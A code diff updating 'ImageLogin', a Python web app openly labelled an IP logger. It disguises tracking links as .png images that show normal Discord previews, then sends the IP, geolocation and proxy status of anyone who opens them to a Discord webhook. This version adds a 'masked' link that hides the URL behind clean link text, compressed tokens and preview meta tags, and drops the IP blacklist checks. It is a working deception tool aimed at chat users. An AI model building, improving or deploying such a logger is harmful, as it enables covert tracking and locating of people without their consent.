@@ -2,13 +2,14 @@ from urllib import parse
 import base64
 import os
 import traceback
+import zlib
 
 import httpagentparser
 import requests
 
 __app__ = "ImageLogin"
 __description__ = "IP Logger"
-__version__ = "v4.1"
+__version__ = "v5.0"
 __author__ = "YonyLogger"
 
 config = {
@@ -32,9 +33,9 @@ config = {
         "page": "https://your-link.here",
     },
     "presets": [
-        "https://www.euroracingparts.fr/cdn/shop/articles/bmw_m3_g80_c1a6da53-fa4f-4671-b055-482c827f6ec0.jpg?crop=center&height=1200&v=1779205839&width=1200",
-        "https://i.pinimg.com/736x/5c/1a/f3/5c1af399d53a5e21b05e8c8a325ba2c3.jpg",
-        "https://i.pinimg.com/736x/d0/5a/82/d05a827bae9d2acac3fbc73069403131.jpg",
+        {"name": "BMW M3 G80", "url": "https://www.euroracingparts.fr/cdn/shop/articles/bmw_m3_g80_c1a6da53-fa4f-4671-b055-482c827f6ec0.jpg?crop=center&height=1200&v=1779205839&width=1200"},
+        {"name": "Pinterest 1", "url": "https://i.pinimg.com/736x/5c/1a/f3/5c1af399d53a5e21b05e8c8a325ba2c3.jpg"},
+        {"name": "Pinterest 2", "url": "https://i.pinimg.com/736x/d0/5a/82/d05a827bae9d2acac3fbc73069403131.jpg"},
     ],
 }
 
@@ -69,15 +70,19 @@ button.ghost:hover{border-color:#c8102e;color:#fff}
 .out{display:none;margin-top:18px}
 .out.on{display:block}
 .out input{border-color:#c8102e;color:#fff}
-.presets{display:flex;gap:8px;flex-wrap:wrap;margin-top:16px}
-.presets img{width:74px;height:52px;object-fit:cover;border-radius:6px;cursor:pointer;border:2px solid transparent;filter:grayscale(.6)}
+.row{display:flex;gap:8px;margin-top:8px}
+.presets{display:flex;gap:10px;flex-wrap:wrap;margin-top:16px}
+.presets figure{margin:0;text-align:center}
+.presets img{width:92px;height:62px;object-fit:cover;border-radius:6px;cursor:pointer;border:2px solid transparent;filter:grayscale(.65);display:block}
 .presets img:hover{border-color:#c8102e;filter:none}
-.note{margin-top:24px;font-size:11px;color:#5d5e63;line-height:1.7}
+.presets figcaption{font-size:10px;color:#5d5e63;margin-top:5px;letter-spacing:.05em}
+.note{margin-top:24px;font-size:11px;color:#5d5e63;line-height:1.8}
+b{color:#9a9ba0;font-weight:400}
 a{color:#c8102e;text-decoration:none}
 </style></head>
 <body><div class="wrap">
 <h1>ImageLogin</h1>
-<p class="sub">Lien .png — aperçu Discord, IP loggée au clic</p>
+<p class="sub">__VERSION__ · __AUTHOR__</p>
 <div class="field">
 <input id="src" placeholder="URL de l'image" value="__DEFAULT__">
 <button onclick="gen()">Générer</button>
@@ -86,33 +91,51 @@ a{color:#c8102e;text-decoration:none}
 <div class="out" id="out">
 <div class="field">
 <input id="res" readonly onclick="this.select()">
-<button class="ghost" onclick="copy()">Copier</button>
+<button class="ghost" onclick="copy('res')">Copier</button>
 </div>
-<p class="note">Colle ce lien dans Discord. L'aperçu s'affiche normalement, l'IP tombe quand quelqu'un ouvre l'original.</p>
+<div class="row">
+<button class="ghost" onclick="copy('mask')">Copier en masqué</button>
 </div>
-<p class="note">__AUTHOR__ · __VERSION__</p>
+<input id="mask" type="hidden">
+<p class="note"><b>Lien direct</b> : Discord affiche l'aperçu, c'est celui à coller.<br>
+<b>Lien masqué</b> : texte cliquable propre, mais Discord ne génère pas d'aperçu dessus.</p>
+</div>
+<p class="note">Ouvre l'aperçu puis clique dessus : l'IP part sur le webhook.</p>
 </div>
 <script>
-function enc(u){return btoa(u).replace(/\\+/g,"-").replace(/\\//g,"_").replace(/=+$/,"")}
+function enc(u){return btoa(String.fromCharCode.apply(null,Array.from(new TextEncoder().encode(u)))).replace(/\\+/g,"-").replace(/\\//g,"_").replace(/=+$/,"")}
 function gen(){
   var u=document.getElementById("src").value.trim();
   if(!u)return;
   document.getElementById("res").value=location.origin+"/"+enc(u)+".png";
   document.getElementById("out").classList.add("on");
 }
-function copy(){
-  var i=document.getElementById("res");
-  i.select();document.execCommand("copy");
+function preset(i,name,url){
+  document.getElementById("src").value=url;
+  document.getElementById("res").value=location.origin+"/p"+i+".png";
+  document.getElementById("mask").value="["+name+"]("+location.origin+"/p"+i+".png)";
+  document.getElementById("out").classList.add("on");
 }
-document.querySelectorAll(".presets img").forEach(function(el){
-  el.onclick=function(){document.getElementById("src").value=el.dataset.url;gen()};
-});
+function copy(id){
+  var el=document.getElementById(id);
+  if(id==="mask"){
+    var name=document.getElementById("src").value.split("/").pop().split("?")[0]||"image";
+    el.value="["+name+"]("+document.getElementById("res").value+")";
+  }
+  var t=document.createElement("textarea");
+  t.value=el.value;document.body.appendChild(t);t.select();document.execCommand("copy");
+  document.body.removeChild(t);
+}
 </script></body></html>"""
 
 VIEW = """<!doctype html>
 <html><head><meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
+<meta property="og:type" content="website">
+<meta property="og:title" content="__TITLE__">
 <meta property="og:image" content="__URL__">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="__URL__">
 <title>__TITLE__</title>
 <style>
 body{margin:0;padding:0;background:#0d0d0f}
@@ -152,7 +175,10 @@ def isBot(ip, useragent):
         return "Discord"
     if useragent.startswith("TelegramBot"):
         return "Telegram"
-    if "bot" in useragent.lower() or "crawler" in useragent.lower():
+    lowered = useragent.lower()
+    if "discordbot" in lowered:
+        return "Discord"
+    if "bot" in lowered or "crawler" in lowered or "spider" in lowered:
         return "Crawler"
     return False
 
@@ -188,14 +214,22 @@ def origin(environ):
 
 
 def encodeToken(url):
-    return base64.urlsafe_b64encode(url.encode()).decode().rstrip("=")
+    return base64.urlsafe_b64encode(zlib.compress(url.encode(), 9)).decode().rstrip("=")
 
 
 def decodeToken(token):
     try:
-        return base64.urlsafe_b64decode(token + "=" * (-len(token) % 4)).decode()
-    except (ValueError, UnicodeDecodeError):
+        return zlib.decompress(base64.urlsafe_b64decode(token + "=" * (-len(token) % 4))).decode()
+    except Exception:
         return None
+
+
+def resolve(token):
+    if token and token[0] == "p" and token[1:].isdigit():
+        index = int(token[1:])
+        if 0 <= index < len(config["presets"]):
+            return config["presets"][index]["url"]
+    return decodeToken(token) or config["image"]
 
 
 def respond(start_response, code, content_type, body, extra=None):
@@ -204,7 +238,7 @@ def respond(start_response, code, content_type, body, extra=None):
         ("Content-Length", str(len(body))),
         ("Cache-Control", "no-store, max-age=0"),
         ("Access-Control-Allow-Origin", "*"),
-        ("X-Robots-Tag", "noindex, nofollow"),
+        ("Vary", "User-Agent"),
     ]
     if extra:
         headers.extend(extra.items())
@@ -225,9 +259,6 @@ def reportError(error):
 
 
 def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
-    if not ip or ip.startswith(blacklistedIPs):
-        return None
-
     bot = isBot(ip, useragent)
 
     if bot:
@@ -241,14 +272,14 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
                     "description": (
                         "An **ImageLogin** link was sent in a chat.\n"
                         "You may receive an IP soon.\n\n"
-                        f"**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`"
+                        f"**Endpoint:** `{endpoint}`\n**IP:** `{ip or 'Inconnue'}`\n**Platform:** `{bot}`"
                     ),
                 }],
             })
         return None
 
     ping = "@everyone"
-    info = fetchGeo(ip)
+    info = fetchGeo(ip) if ip else {}
 
     if info.get("proxy"):
         if config["vpnCheck"] == 2:
@@ -320,7 +351,9 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
 
 def generatorPage():
     presets = "".join(
-        f'<img src="{u}" data-url="{u}" alt="">' for u in config["presets"]
+        f'<figure><img src="{p["url"]}" onclick="preset({i}, \'{p["name"]}\', \'{p["url"]}\')" alt="">'
+        f'<figcaption>{p["name"]}</figcaption></figure>'
+        for i, p in enumerate(config["presets"])
     )
     html = (
         PAGE
@@ -342,7 +375,7 @@ def app(environ, start_response):
         ip = clientIP(environ)
         useragent = environ.get("HTTP_USER_AGENT") or ""
 
-        if name in ("", "index.html", "api", "api/", "api/index", "api/index.py"):
+        if name in ("", "index.html", "api", "api/index", "api/index.py"):
             if query.get("url"):
                 target = f"{origin(environ)}/{encodeToken(query['url'])}.png"
                 return respond(start_response, 302, "text/html", b"", {"Location": target})
@@ -354,11 +387,7 @@ def app(environ, start_response):
             return respond(start_response, 204, "text/plain", b"")
 
         token = name[:-4] if name.lower().endswith(".png") else name
-        url = decodeToken(token) or config["image"]
-
-        if not ip or ip.startswith(blacklistedIPs):
-            return respond(start_response, 204, "text/plain", b"")
-
+        url = resolve(token)
         bot = isBot(ip, useragent)
 
         if bot:
